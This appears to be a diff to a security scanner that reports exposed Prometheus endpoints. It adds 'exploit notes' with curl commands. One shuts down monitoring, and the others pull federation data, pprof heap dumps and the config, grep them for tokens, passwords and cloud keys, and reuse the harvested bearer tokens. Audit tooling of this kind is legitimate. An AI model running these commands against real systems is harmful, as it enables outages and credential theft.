@@ -206,10 +206,12 @@ def prometheus_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "curl", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -239,7 +241,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "exposed port. Bind the management endpoints to loopback / a "
                     "management-only interface, or gate them behind an "
                     "authenticating reverse proxy.",
-                    ["CWE-306", "CWE-284"], kind="prom_admin_writable"))
+                    ["CWE-306", "CWE-284"], kind="prom_admin_writable",
+                    exploit_note=(
+                        "curl -X POST http://<ip>:9090/-/reload; then curl -X POST "
+                        "http://<ip>:9090/-/quit for a monitoring blackout PoC "
+                        "(destructive). To exfiltrate: swap the config on disk if "
+                        "you have write access, then reload."),
+                    depth_tier="t1"))
             if pr.get("federate_open"):
                 sh = pr.get("federate_series_hint", 0)
                 out.append(_finding(
@@ -260,7 +268,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Prometheus's native web.config.file basic_auth_users / "
                     "mTLS). Restrict allowed matchers if federation is required "
                     "for legitimate downstream servers.",
-                    ["CWE-200", "CWE-306"], kind="prom_federate_open"))
+                    ["CWE-200", "CWE-306"], kind="prom_federate_open",
+                    exploit_note=(
+                        "curl -skG --data-urlencode 'match[]={__name__=~\".+\"}' "
+                        "http://<ip>:9090/federate -o federate.txt; grep -aE "
+                        "'(token|password|jwt|Bearer|AKIA|-----BEGIN)' federate.txt"),
+                    depth_tier="t1"))
             if pr.get("pprof_cmdline"):
                 sample = pr.get("cmdline_sample", "")
                 short = (sample[:140] + "...") if len(sample) > 140 else sample
@@ -281,7 +294,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "with a proxy that blocks /debug/pprof/*. Never pass "
                     "secrets via CLI flags — use --web.config.file or "
                     "environment variables.",
-                    ["CWE-200", "CWE-215"], kind="prom_pprof_cmdline"))
+                    ["CWE-200", "CWE-215"], kind="prom_pprof_cmdline",
+                    exploit_note=(
+                        "curl http://<ip>:9090/debug/pprof/cmdline | tr '\\0' '\\n'; "
+                        "then curl http://<ip>:9090/debug/pprof/heap?debug=1 | "
+                        "grep -aiE 'token|password|bearer|aws_|gcp_' — mine for "
+                        "in-flight secrets."),
+                    depth_tier="t1"))
             if pr.get("config_readable"):
                 out.append(_finding(
                     "high",
@@ -296,7 +315,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Restrict Prometheus's HTTP API behind a reverse-proxy with "
                     "authentication, or bind it to a management-only interface. "
                     "Rotate any embedded scrape credentials.",
-                    ["CWE-200", "CWE-306"], kind="prom_config_readable"))
+                    ["CWE-200", "CWE-306"], kind="prom_config_readable",
+                    exploit_note=(
+                        "curl -sk http://<ip>:9090/api/v1/status/config | jq -r "
+                        ".data.yaml | grep -E 'bearer_token|username|password|"
+                        "http[s]?://' — collect creds + internal URLs, then curl "
+                        "each with the disclosed bearer to confirm reuse."),
+                    depth_tier="t1"))
             if pr.get("query_open"):
                 out.append(_finding(
                     "medium",
